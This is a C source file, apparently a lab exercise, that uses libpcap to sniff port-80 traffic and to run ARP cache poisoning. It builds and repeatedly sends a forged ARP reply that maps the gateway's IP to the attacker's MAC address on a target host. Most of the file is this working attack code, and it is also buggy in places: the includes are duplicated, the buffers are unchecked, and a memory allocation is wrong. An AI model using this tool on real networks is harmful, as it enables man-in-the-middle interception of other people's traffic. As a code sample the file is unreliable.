// GOALS
// 1. ARP relay
// 2. Recovery Detect & Auto poisoning


// PLAN
// pcap_A04_arp_sppof.c : Complete
// pcap_A04_arp_spoof_v1 : Frist Basic Arp spoofing
// pcap_A04_arp_sppof_v2 : Arp relay


#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ether.h>	     // for either_ntoa
#include <netinet/if_ether.h>    // for ehter sturcture
#include <netinet/ip.h>    		 // for ip structure
#include <netinet/tcp.h>  		 // for tcp structure
#include <arpa/inet.h>
#include <math.h>
#include <string.h>



#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ether.h>	     // for either_ntoa
#include <netinet/if_ether.h>    // for ehter sturcture
#include <netinet/ip.h>    		 // for ip structure
#include <netinet/tcp.h>  		 // for tcp structure
#include <arpa/inet.h>
#include <math.h>
#include <string.h>


int _pcap_func(char *dev_str);
void _arp_sniff_func(u_char *t_ip, u_char *t_mac);



//======================================================================================
//====================================MAIN()============================================ 

int main(int argc, char *argv[]){


	u_char dev_str[80];
	strcpy(dev_str,argv[1]);

	printf("Dev: %s\n",dev_str);



	u_char str[80] ;
	strcpy(str,argv[2]);

	u_char str2[80];
	strcpy(str2,argv[3]);


	const char s[2] = ".";
	const char s2[2]=":";
	
	char *token;
	char *token2;

	u_char t_ip[4];
	u_char t_mac[6];

	int i=0;
	
// STRAT : IP ADDRESS
//	printf("=====Token: IP START=======\n");
	token = strtok(str, s);
	while( token != NULL ) 
	{
//	  printf( "%s ", token );
	  t_ip[i]=atoi(token);
	  i++;
	  token = strtok(NULL, s);
	}
//	printf("\n====Token: IP END=====\n");


// START : MAC ADDRESS
//	printf("====Token: MAC START====\n");
	token2=strtok(str2,s2);                
	int k=0;
	while( token2 != NULL ) 
	{
//	  printf( "*%s ", token2 );
	  t_mac[k]=strtol(token2,NULL,16);
	  k++;
	  token2 = strtok(NULL, s2);
//	  printf(" k : %d, t_mac[%d]: %d \n",k,k,t_mac[k]);

	}
//	printf("\n====Token: MAC END====\n");

// PRINT IP
	printf("=======target IP=========\n");
	for(int j=0; j<4; j++){
		printf("%d ",t_ip[j]);
	}
	printf("\n");
// PRINT MAC	
	printf("=======target MAC========\n");
	for(int l=0; l<6; l++){
		printf("%x ",t_mac[l]);
	}
	printf("\n");



	
	char *_input = (char *)malloc(sizeof(_input));

	_AGAIN:             // if didn't choose 1 or 2,  come here and repeat.
	setbuf(stdout,NULL);
	setbuf(stdin,NULL);

	printf("Choose option:\n");
	printf("1. Packet sniff (port:80) \n");
	printf("2. ARP spoofing\n");
	printf("> ");
	scanf("%d", _input);
	//printf("chekc input : %d\n", *_input);

	switch(*_input){
		case 1:
			//printf("_pcap_func()\n\n");
			_pcap_func(dev_str);
			break;
		case 2:
			printf("_arp_sniff_func()\n");
			_arp_sniff_func(t_ip,t_mac);
			break;
		default:
			printf("Wrong option. choose 1 or 2\n");
			goto _AGAIN;
			break;
	}

	printf("\n*END Packet sniff*\n");

}


//======================================================================================
//===============================_arp_sniff_func()======================================


void _arp_sniff_func(u_char *t_ip, u_char *t_mac){
	u_char s_arp[43]={               
		/* 						ETHER PACKET    				       			 */
		0x00,0x0c,0x29,0xff,0x61,0x71,   /*Destination Mac : Target(VM_win10)    */ 
		0x00,0x0c,0x29,0xcd,0xda,0x7a,   /*Source Mac      : Attacker(VM_Ubuntu) */
		0x08, 0x06,				         /*Ether Type                			 */
		/*				  	   NOW ARP PACKET  									 */
		0x00, 0x01,						 /*Hardware Type 						 */
		0x08, 0x00,						 /*Protocol Type 						 */
		0x06,					         /*Hardware Size, Length      			 */ 
		0x04,					         /*Protocol Size			  			 */
		0x00, 0x02,				         /*Opcode, 2 is replay        			 */
		0x00,0x0c,0x29,0xcd,0xda,0x7a,   /*Sender MAC      : Attacker(VM_Ubuntu) */
		0xc0,0xa8,0xf6,0x02,		     /*Sender IP (GW IP)		 			 */
		0x00,0x0c,0x29,0xff,0x61,0x71,   /*Target MAC      : Target(VM_win10)    */
		0xc0,0xa8,0xf6,0x89				 /*Tartget IP      : Target              */
	};

	for(int i=0; i<6; i++){
		s_arp[i]=t_mac[i];
		s_arp[33+i]=t_mac[i];
	}
	for(int i=0; i<4; i++){
		s_arp[39+i]=t_ip[i];
	}





	pcap_t *s_handle;
	u_char *s_packet;
	struct pcap_pkthdr *header;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	bpf_u_int32 mask;
	bpf_u_int32 net;

	char filter_exp[] = "port 80";

	int count=0;

	setbuf(stdout,NULL);
	


	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	s_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
	
	printf("============================================================\n");
	printf("Dev : %s\n",dev);
	printf("Packet size : %d \n",sizeof(s_arp));
	

	while(1){

// CHECK WHAT I SENT
	for(count=0; count<sizeof(s_arp); count++){
		pcap_sendpacket(s_handle, s_arp, 43);
/*
		if(count%16==0) printf("\n");
		printf("%02x ",s_arp[count]);
*/
		printf("\nTarget IP: ");
		for(int i=0; i<4; i++){
			printf("%d ",s_arp[39+i]);
		}
		printf("\n");
		printf("Target MAC: ");
		for(int i=0; i<6; i++){
			printf("%02x ", s_arp[33+i]);
		}
		printf("\n");
		
	}

	printf("\n");
}

}




//======================================================================================
//===============================_pcap_func()===========================================

int _pcap_func(char *dev_str){
	printf("*Now waitng Packets. go to connect*\n");
	pcap_t *handle;	
	u_char *packet;
	struct pcap_pkthdr *header;		

	char *dev;			
	char errbuf[PCAP_ERRBUF_SIZE];	
	struct bpf_program fp;		
	bpf_u_int32 mask;	
	bpf_u_int32 net;		

	static int _packet_pointer=0; // example -> packket[_packet_pointer]
	char filter_exp[] = "port 80";	

// STRAT : STRUCT DECLARATION 
	struct ether_header *_eth;
	struct ip *_ip;
	struct tcphdr *_tcp;
	char *_data;
	int hdr_length;
// END : STRUCT DECLARATION

	int ck_packet; // check packet, where it rightly receive packets or not.
	int _input=0; // scanf vaiable

	/* Define the device */
	dev = pcap_lookupdev(errbuf);
	printf("%s\n",dev);
	if (dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) { fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle)); return(2); }
	if (pcap_setfilter(handle, &fp) == -1) { fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle)); return(2); }


//START 
	while(1){
		ck_packet = pcap_next_ex(handle, &header,&packet);
		_packet_pointer=0;


		if(ck_packet==0){
			printf("ck_packet=0, it means ""TIME OUT""\n");
			continue;   //if TIMOUT, then just keep going
		}
		else if(ck_packet==1){
			_eth=(struct ether_header*)(packet);
			_packet_pointer+=sizeof(struct ether_header);


// START : DATA LINK LAYER
			printf("================DATA LINK Layer=======================\n");
			printf("dst MAC : %s\n", ether_ntoa((struct ether_header*) _eth->ether_dhost));
			printf("src MAC : %s\n", ether_ntoa((struct ether_header*) _eth->ether_shost));
			printf("Type    : %04x\n\n", ntohs(_eth->ether_type));
			printf("=====================================================\n");
// END : DATA LINK LAYER	


// START : NETWORK LAYER
			if(ntohs(_eth->ether_type)==ETHERTYPE_IP){
				_ip=(struct ip*)(&(packet[_packet_pointer])); 
				_packet_pointer+=_ip->ip_hl*4;

				printf("================NETWORK Layer=======================\n");
				printf("\ndst IP : %s\n", inet_ntoa( _ip->ip_dst));
				printf("src IP : %s\n", inet_ntoa( _ip->ip_src));

				goto _TCP_LABEL;
			}
			else if(ntohs(_eth->ether_type)==ETHERTYPE_ARP){
				printf("ARP Packet. on Process.\n");	
			}
			else {
				printf("Undifined Yey. on Process. \n");	
			}
// END : NETWORK LAYER


// START : TRANSPORT LAYER
			_TCP_LABEL:
			if(_ip->ip_p==0x06){
				_tcp=(struct tcphdr*)(&(packet[_packet_pointer]));
				_packet_pointer+=_tcp->th_off*4;
				printf("================Transport Layer==================\n");
				printf("dst Port : %d\n",ntohs(_tcp->th_dport));
				printf("src Port : %d\n",ntohs(_tcp->th_sport));
				//printf("Sequence    Number : %d\n",_tcp->th_seq);
				//printf("Acknowledge Number : %d\n",_tcp->th_ack);
			}
			else if(_ip->ip_p==0x07){
				printf("Protocol : UDP\n");
			}	
// END : TRANSPORT LAYER
	
// START : DATA LAYER 
			for(int i=0; i<ntohs(_ip->ip_len)*4;i++){
				
				if(i+1>=_packet_pointer){
					printf("%c",packet[i]);
				}
				else if(i%16==0)
					printf("\n");
				else
					printf("%02x ",packet[i]);
			}		
// END : DATA LAYER

		printf("\n");

		}
		else{
			printf("ck_packout wrong -1(Device down) or -2(EOF)\n");
			break;
		}
	}
	pcap_close(handle);
	return(0);
 }

	
// <netinet/if_ether.h>  : http://unix.superglobalmegacorp.com/Net2/newsrc/netinet/if_ether.h.html
// <netinet/ip.h>		 : http://unix.superglobalmegacorp.com/Net2/newsrc/netinet/ip.h.html
// <netinet/tcp.h> 		 : http://unix.superglobalmegacorp.com/BSD4.4Lite2/newsrc/netinet/tcp.h.html

